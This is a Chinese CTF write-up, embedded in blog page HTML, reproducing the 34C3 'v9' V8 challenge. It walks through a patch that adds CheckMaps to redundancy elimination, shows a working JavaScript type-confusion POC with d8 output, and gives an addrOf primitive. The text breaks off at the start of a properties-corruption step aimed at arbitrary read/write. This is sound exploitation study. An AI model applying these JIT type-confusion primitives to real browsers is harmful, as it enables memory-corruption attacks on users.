@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="34c3_v9复现，由于Patch的改动导致了Type Confusion，学习了一个新姿势。">
+<meta name="keywords" content="exploit,Browser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="34c3 v9">
+<meta property="og:url" content="http://yoursite.com/2020/05/31/34c3-v9/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="34c3_v9复现，由于Patch的改动导致了Type Confusion，学习了一个新姿势。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/05/31/34c3-v9/000.png">
+<meta property="og:updated_time" content="2020-06-01T12:33:20.108Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="34c3 v9">
+<meta name="twitter:description" content="34c3_v9复现，由于Patch的改动导致了Type Confusion，学习了一个新姿势。">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/31/34c3-v9/000.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/31/34c3-v9/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>34c3 v9 | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/31/34c3-v9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">34c3 v9
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-31 16:18:55" itemprop="dateCreated datePublished" datetime="2020-05-31T16:18:55+08:00">2020-05-31</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-06-01 20:33:20" itemprop="dateModified" datetime="2020-06-01T20:33:20+08:00">2020-06-01</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/" itemprop="url" rel="index"><span itemprop="name">Browser</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/v8/" itemprop="url" rel="index"><span itemprop="name">v8</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>34c3_v9复现，由于Patch的改动导致了Type Confusion，学习了一个新姿势。</p>
+<a id="more"></a>
+<hr>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>mkdir v9 &amp;&amp; cd v9
+fetch v8 &amp;&amp; cd v8           # see https://github.com/v8/v8/wiki/Building-from-Source
+git checkout 6.3.292.48
+gclient sync
+patch -p1 &lt; /path/to/v9.patch
+./tools/dev/v8gen.py x64.debug
+ninja -C out.gn/x64.debug
+</code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><pre><code>$ cat v9.patch
+</code></pre><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index 3a40e8d..cb51acc 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/redundancy-elimination.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/redundancy-elimination.cc</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,8 @@</span></span><br><span class="line"> #include "src/compiler/redundancy-elimination.h"</span><br><span class="line"> </span><br><span class="line"> #include "src/compiler/node-properties.h"</span><br><span class="line"><span class="addition">+#include "src/compiler/simplified-operator.h"</span></span><br><span class="line"><span class="addition">+#include "src/objects-inl.h"</span></span><br><span class="line"> </span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"> namespace internal &#123;</span><br><span class="line">@@ -23,6 +25,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     case IrOpcode::kCheckHeapObject:</span><br><span class="line">     case IrOpcode::kCheckIf:</span><br><span class="line">     case IrOpcode::kCheckInternalizedString:</span><br><span class="line"><span class="addition">+    case IrOpcode::kCheckMaps:</span></span><br><span class="line">     case IrOpcode::kCheckNumber:</span><br><span class="line">     case IrOpcode::kCheckReceiver:</span><br><span class="line">     case IrOpcode::kCheckSmi:</span><br><span class="line">@@ -129,6 +132,14 @@ bool IsCompatibleCheck(Node const* a, Node const* b) &#123;</span><br><span class="line">     if (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       // CheckInternalizedString(node) implies CheckString(node)</span><br><span class="line"><span class="addition">+    &#125; else if (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span></span><br><span class="line"><span class="addition">+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span></span><br><span class="line"><span class="addition">+      // CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line"><span class="addition">+      ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span></span><br><span class="line"><span class="addition">+      ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span></span><br><span class="line"><span class="addition">+      if (!b_maps.contains(a_maps)) &#123;</span></span><br><span class="line"><span class="addition">+        return false;</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line">     &#125; else &#123;</span><br><span class="line">       return false;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>在RedundancyElimination加入了对于CheckMaps的Reduce。<br>Checkmap用于检查某个对象的类型有没有发生变化。<br>其调用过程如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.Get(node)) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">  	...</span><br><span class="line">  	<span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">  	...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Reduction RedundancyElimination::ReduceCheckNode(Node* node) &#123;</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks <span class="keyword">const</span>* checks = node_checks_.Get(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    <span class="keyword">return</span> Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Learn from this check.</span></span><br><span class="line">  <span class="keyword">return</span> UpdateChecks(node, checks-&gt;AddCheck(zone(), node));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a-&gt;op() != b-&gt;op()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">        b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">      <span class="comment">// CheckInternalizedString(node) implies CheckString(node)</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = a-&gt;op()-&gt;ValueInputCount(); --i &gt;= <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;InputAt(i) != b-&gt;InputAt(i)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Reduce中对于CheckMaps时，在LookupCheck中<br><code>for (Check const* check = head_; check != nullptr; check = check-&gt;next)</code><br>遍历其他check，并调用<code>IsCompatibleCheck</code>函数。在该函数中，如果节点均为<code>CheckMaps</code>，则会检查<code>CheckMaps</code>是否兼容，如果<code>a_maps</code>是<code>b_maps</code>的子集，则<code>CheckMaps</code>是兼容的。此时在<code>IsCompatibleCheck</code>中返回<code>True</code>，在<code>LookupCheck</code>中返回<code>check-&gt;node</code>，<code>node</code>节点被替换。如果一个节点被多次检查，则可以忽略后面的检查。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">str, val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] "</span> + str + <span class="string">" -&gt; "</span>+ hex(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">x</span>:<span class="number">1.1</span>, <span class="attr">y</span>:<span class="number">2.2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">3.3</span>, <span class="attr">b</span>: <span class="number">4.4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger func</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">triggerFunc</span>(<span class="params">o,callback</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> tmp = o.a;</span><br><span class="line">	callback();</span><br><span class="line">	<span class="keyword">return</span> o.b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">usable</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	o.b = obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// console.log(triggerFunc(o,()=&gt;1));</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x12000</span>; i++)&#123;</span><br><span class="line">	triggerFunc(o, () =&gt; <span class="number">0</span>);</span><br><span class="line">	triggerFunc(o, () =&gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> objLeakAddr = tC.f2u(triggerFunc(o,usable));</span><br><span class="line">success(<span class="string">"objLeakAddr"</span>,objLeakAddr);</span><br><span class="line">%DebugPrint(obj);</span><br></pre></td></tr></table></figure>
+<pre><code>$ ~/browser/v8/out.gn/x64.debug/d8 --allow-natives-syntax ./poc.js 
+[+] objLeakAddr -&gt; 0x000024df95306101
+DebugPrint: 0x24df95306101: [JS_OBJECT_TYPE]
+ - map = 0x25fac8d0c931 [FastProperties]
+ - prototype = 0x2356ade846a9
+ - elements = 0x160aaa282251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties = 0x160aaa282251 &lt;FixedArray[0]&gt; {
+    #x: &lt;unboxed double&gt; 1.1 (data field 0)
+    #y: &lt;unboxed double&gt; 2.2 (data field 1)
+ }
+0x25fac8d0c931: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 40
+ - inobject properties: 2
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x25fac8d0c8e1 &lt;Map(HOLEY_ELEMENTS)&gt;
+ - instance descriptors (own) #2: 0x24df9530bd81 &lt;FixedArray[8]&gt;
+ - layout descriptor: 0x300000000
+ - prototype: 0x2356ade846a9 &lt;Object map = 0x25fac8d022a1&gt;
+ - constructor: 0x2356ade846e1 &lt;JSFunction Object (sfi = 0x160aaa2a3b59)&gt;
+ - dependent code: 0x160aaa282251 &lt;FixedArray[0]&gt;
+ - construction counter: 0
+</code></pre><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在漏洞利用方面学到了一个新姿势，通过修改<code>obj</code>的<code>Properties</code>来获得一个完整的<code>RW</code>原语。<br>这里部分参考<a href="https://github.com/ray-cp/browser_pwn/blob/master/34c3ctf-v9/exp.js" target="_blank" rel="noopener">raycp师傅的exploit</a>。</p>
+<h2 id="addrOf原语"><a href="#addrOf原语" class="headerlink" title="addrOf原语"></a>addrOf原语</h2><p>如POC中一样。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1.1</span>, <span class="attr">b</span>: <span class="number">2.2</span>&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">triggerFunc</span>(<span class="params">o, callback</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">let</span> tmp = o.a;</span><br><span class="line">		callback(tmp);</span><br><span class="line">		<span class="keyword">return</span> o.b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">usableFunc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		o.b = obj;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x12000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		triggerFunc(o,()=&gt;<span class="number">1</span>);</span><br><span class="line">		triggerFunc(o,()=&gt;<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> ret = tC.f2u(triggerFunc(o,usableFunc));</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="修改Properties"><a href="#修改Properties" class="headerlink" title="修改Properties"></a>修改Properties</h2><p>对于如下对象<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">	c : <span class="number">1.1</span></span><br><span class="line">&#125;;</span><br><span class="line">o.d = <span class="number">2.2</span>;</span><br></pre></td></tr></table></figure></p>
+<pre><code>DebugPrint: 0x3e5206a41ca1: [JS_OBJECT_TYPE]
+ - map = 0xbc7d550b761 [FastProperties]
+ - prototype = 0x2422aa4046a9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties = 0x3e5206a41cc1 &lt;PropertyArray[3]&gt; {
+    #c: &lt;unboxed double&gt; 1.1 (data field 0)
+    #d: 0x3e5206a41ce9 &lt;MutableNumber 2.2&gt; (data field 1) properties[0]
+ }
+0xbc7d550b761: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 32
+ - inobject properties: 1
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 2
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0xbc7d550b711 &lt;Map(HOLEY_ELEMENTS)&gt;
